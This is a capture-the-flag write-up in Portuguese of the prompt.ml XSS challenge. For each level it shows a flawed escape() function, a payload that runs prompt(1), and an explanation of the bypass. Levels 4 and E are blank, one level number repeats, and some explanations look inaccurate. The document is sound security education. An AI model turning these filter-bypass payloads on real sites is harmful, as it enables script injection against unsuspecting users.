# Cross-site scripting (XSS) 
###### Solved by @Mayaracar2
> This is a CTF about JavaScript analysis, xss script
## Desafio: Prompt.ml
### Sobre o desafio:
O prompt.ml é uma série de desafios de XSS (Cross-Site Scripting) organizada em níveis, cada um apresentando uma função escape() diferente que impõe filtros específicos na entrada do usuário, e tem como objetivo explorar vulnerabilidades para conseguir rodar código JavaScript, usando o prompt(1) como prova de que o XSS foi bem sucedido.
- [Página do desafio](https://prompt.ml/0)
  
## Soluções:
### Fase 0
Este é o código dado:

```bash
 function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
#### Análise:

A função gera um elemento `<input>` com o valor recebido diretamente, sem escapar caracteres especiais. Isso permite que um atacante quebre o atributo `value` e injete código arbitrário.

#### Payload usado:

```bash
"><script>prompt(1)</script>`
```

#### Por que funciona?

-Fecha o atributo value usando `>`, escapando do contexto onde o conteúdo deveria ser tratado apenas como texto.

-Em seguida, ele insere uma tag `<script>`, que o navegador reconhece e executa como código JavaScript, visto que a função não realiza nenhum filtro ou escape dos caracteres especiais (<, >, "), o navegador interpreta a injeção como parte do HTML, em vez de simples texto, permitindo a execução do script malicioso.

### Fase 1
Este é o código dado:

```bash
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}         
```
#### Análise:

Neste código, a função recebe um input e remove todas as tags HTML usando uma expressão regular (stripTagsRE).

#### Payload usado:

```bash
<svg/onload=prompt(1)
```

#### Por que funciona?

`<svg/`: A regex falha em detectá-lo como tag devido à sua sintaxe incomum, porém passa "ileso".

`onload=prompt(1)`: Atributo de evento JavaScript que é disparado, executando o prompt(1).

### Fase 2
Este é o código dado:

```bash
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```

#### Análise:

Nesse código, tem uma função de escape que remove caracteres específicos como `(=` e `()` de uma string de entrada.

#### Payload usado:

```bash
<svg><script>prompt&#40;1)</script>
```

#### Por que funciona?

`<svg>`: Utilizado como uma "camuflagem", na qual a tag é permitida pelo navegador, ativando o modo SVG e dentro dele, é possivel rodar o <script> normalmente.

`prompt&#40;1)`: O `&#40;` é decodificado pelo navegador como `(` , com base no  [HTML entities](https://www.freeformatter.com/html-entities.html).

### Fase 3
Este é o código dado:

```bash
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```

#### Análise:

Nesse código, a função de escape adiciona o input dentro de um comentário HTML, evitando a execução de scripts maliciosos, substituindo `->`por `_`.

#### Payload usado:

```bash
--!><svg onload=prompt(1)
```

#### Por que funciona?

`--!>`: Como o código não aceita ->, é preciso fechar o comentário para depois o payload ser executado.

`<svg onload=prompt(1)>`: Executa o JavaScript quando o elemento é carregado.

### Fase 4
Este é o código dado:

```bash

       
```
#### Payload usado:

```bash

```

#### Por que funciona?

### Fase 5
Este é o código dado:

```bash
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}            
```

#### Análise:

Este código, impede de gerar tags devido o bloqueio do `>`, bloqueia também qualquer atributo de evento como o anload=, onclick=, onerror=, devido o `on.+?`, além de bloquear a palavra `focus`.

#### Payload usado:

```bash
"type=image src onerror
="prompt(1)
```

#### Por que funciona?

- O filtro usou uma regex fraca, na qual o atacante inseriu uma quebra de linha entre o nome do evento e o sinal `=`.

- O navegador ignora a quebra e interpreta como atributo válido `(onerror=)`.

- O onerror dispara quando a imagem não carrega e o `prompt(1)` é executado.

### Fase 6
Este é o código dado:

```bash
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}          
```

#### Análise:

No código, a função recebe uma entrada no formato `URL#JSON`, gerando um formulário HTML a partir dos dados do JSON e realizando automaticamente o envio por POST.

#### Payload usado:

```bash
javascript:prompt(1)#{"action":1}
```

#### Por que funciona? 

- Quando o `javascript:` é insrido em um link (ou na barra do navegador), tudo depois de javascript: é avaliado como código JavaScript.

- O navegador interpreta apenas a parte antes do # como código JavaScript.

- Tudo após o # é tratado como fragmento da URL (hash), e o navegador não executa isso como código.

### Fase 7
Este é o código dado:

```bash
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}        
```

#### Análise:

No código a função recebe uma string com títulos separados por # e limita cada título a cada 12 caracteres e transforma cada um em uma tag <p> com classe comment e atributo title. Depois junta tudo em uma string com quebra de linha.

#### Payload usado:

```bash
"><svg/m=#"onload='/*#*/prompt(1)'
```

#### Por que funciona? 

`>`: fecha o value

`<svg/m=#"`: Entra no svg e para confundir/fechar atributos anteriores.

`onload='prompt(1)'`: Usado para disparar o prompt(1), logo depois da tag ser carregada.

`/*#*/`: Comentário usado para burlar filtros de caracteres, ele é necessário porque o navegador ignora o comentário, porém ele quebra o padrão que o filtro procura.

### Fase 8
Este é o código dado:

```bash
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```

#### Análise:

Nesse código, a função escape remove quebra de linh, aspas e alguns caracteres HTML, inserindo a string dentro de um comentário em `<script>` com um console.log.

#### Payload usado:

```bash
document.getElementById("input").value="\u2028prompt(1)\u2028-->"
```
(executado no console)

#### Por que funciona? 

Funciona porque `\u2028` em JavaScript é interpretado como uma quebra de linha, portanto encerra o comentário e passa a executar o prompt(1).

### Fase 8
Este é o código dado:

```bash
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}        
```

#### Análise:

O código procura qualquer tag HTML que começa com `<` e é seguido de letra, adicionando um `_` depois do `<`.

#### Payload usado:

```bash
<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
```
#### Por que funciona? 

`ſvg`: Um caracter unicode (U+ 017F) que visualmente parece com s, então é aceito como equivalente.

`onload=`: Dispara quando o elemento é carregado.

`&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;`: São entidades númericas HTML que representa caracteres ASCII, que quando interpretado, converte para texto normal.

`&#112;` → p

`&#114;` → r

`&#111;` → o

`&#109;` → m

`&#112;` → p

`&#116;` → t

`&#40;` → (

`&#49;` → 1

`&#41;` → )

### Fase A
Este é o código dado:

```bash
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}        
```
#### Análise:

A função aplica codificação e manipulações no input para bloquear o uso de prompt, mas insere o resultado diretamente dentro de uma tag <script>.

#### Payload usado:

```bash
p'rompt(1)
```
#### Por que funciona? 

A sequência `p'rompt(1)` é usada para driblar filtros básicos que bloqueiam diretamente a palavra prompt e ao inserir um caractere extra, como `'`, dentro do termo, o filtro não identifica a palavra completa e permite que ela passe. 

### Fase B
Este é o código dado:

```bash
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}        
```

#### Análise:

A função tenta higienizar o valor recebido (como um nome de usuário), transforma esse valor em JSON e depois o insere dentro de uma tag <script>.

#### Payload usado:

```bash
"(prompt(1))in"
```

#### Por que funciona? 

Funciona porque o filtro não bloqueia o conteúdo, e dentro de uma tag `<script>` o JavaScript interpreta `(prompt(1))` como uma chamada de função válida. O uso de `in` garante que o código continue sendo uma expressão válida, evitando que o script quebre.

### Fase C
Este é o código dado:

```bash
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```
#### Análise:

A função escape codifica o valor recebido com `encodeURIComponent`, elimina caracteres de aspas simples e troca qualquer ocorrência da palavra prompt por alert. Em seguida, insere esse conteúdo diretamente dentro de uma tag `<script>`.

#### Payload usado:

```bash
eval(630038579..toString(30))(1)
```

#### Por que funciona? 

Esse código funciona porque o número `630038579` convertido para base 30 vira a string `"eval"`. Assim, ele reconstroi dinamicamente a função `eval` e a executa com argumento `1`.

### Fase D
Este é o código dado:

```bash
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}        
```
#### Análise:

O código recebe um JSON com a URL de uma imagem, aplica configurações padrão por meio de extend, faz uma validação simplificada da URL usando regex e depois gera uma tag substituindo diretamente `{{source}}`.

#### Payload usado:

```bash
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```

#### Por que funciona? 

Isso funciona porque o `extend()` permite poluir o `__proto__`, o que injeta a propriedade source maliciosa dentro de config. A regex de validação não é suficiente para bloquear isso, e o valor injetado vai parar dentro do src da `<img>`, ativando o onerror.

### Fase E
Este é o código dado:

```bash

```
#### Análise:

#### Payload usado:

```bash

```

#### Por que funciona? 

### Fase F
Este é o código dado:

```bash
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}        
```
#### Análise:

No código, a função escape recebe um texto no formato `texto1#texto2#texto3...` e realiza várias operações para gerar conteúdo HTML estruturado:

- Remoção de caracteres especiais:

Inicialmente, todos os asteriscos (*) presentes no input são eliminados, evitando que eles interfiram na formatação ou no conteúdo dos parágrafos gerados.

- Divisão do texto em segmentos:

O input é separado usando o caractere `#` como delimitador, cada pedaço entre os # se torna um segmento independente que será transformado em um parágrafo.

- Geração de parágrafos HTML:

Para cada segmento criado, a função gera uma tag `<p>` no HTML.

Cada parágrafo recebe dois atributos especiais:

`title`: contém os primeiros 15 caracteres do segmento e esses caracteres não passam por sanitização, ou seja, são inseridos diretamente no HTML.

`data-comment`: contém um JSON seguro no formato {"id": índice}, em que o índice representa a posição do segmento na lista.

Dessa forma, a função transforma um texto delimitado por `#` em múltiplos parágrafos HTML, cada um com metadados associados de forma estruturada e segura (para o JSON), mas deixando o conteúdo textual parcialmente exposto no atributo title.

#### Payload usado:

```bash
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
```

#### Por que funciona? 

- O filtro da função escape não impede a injeção, porque ele só remove `*` e limita o tamanho do título, não escapa caracteres especiais como `" ou <`, o payload fecha o atributo title `(">)` e insere tags diretamente no HTML.

- Os comentários HTML `<!--#-->` são ignorados pelo navegador, mas enganam o filtro, permitindo que o `prompt(1)` seja executado sem ser detectado.

## Conclusão:

O desafio Prompt.ml demonstra como filtros superficiais e funções de escape mal implementadas podem ser contornados de diversas formas, permitindo a execução de código JavaScript malicioso e evidenciando a importância de validação e escaping rigorosos em todos os contextos.
